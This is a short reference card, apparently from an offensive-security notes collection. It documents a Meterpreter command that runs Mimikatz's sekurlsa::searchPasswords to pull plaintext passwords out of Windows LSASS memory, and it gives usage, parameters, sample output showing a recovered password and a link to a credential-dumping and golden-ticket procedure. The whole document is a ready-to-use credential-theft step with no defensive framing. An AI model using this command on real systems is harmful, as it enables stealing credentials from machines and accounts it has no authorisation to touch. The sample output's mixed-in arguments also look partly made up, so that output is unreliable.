---
type: command
executor: meterpreter
data: 'mimikatz_command -f sekurlsa::searchPasswords'
output: null
platforms:
  - Windows
tags:
  - mimikatz
  - memory-search
verified: true
validated: true
---

# mimikatz-sekurlsa-search-passwords

## Command

```meterpreter
mimikatz_command -f sekurlsa::searchPasswords
```

## Description

Searches LSASS memory for plaintext password strings, useful for recovering weakly protected or cached credentials in running processes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -f sekurlsa::searchPasswords | Initiates memory search for passwords | Yes |

## Examples

### Basic Usage

```meterpreter
mimikatz_command -f sekurlsa::searchPasswords
```

## Expected Output

[00007FF6...] sekurlsa::searchPasswords /in:sam /limit:1
String            : 'password123'
Address           : 0x00007ff6...
Process           : lsass.exe

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
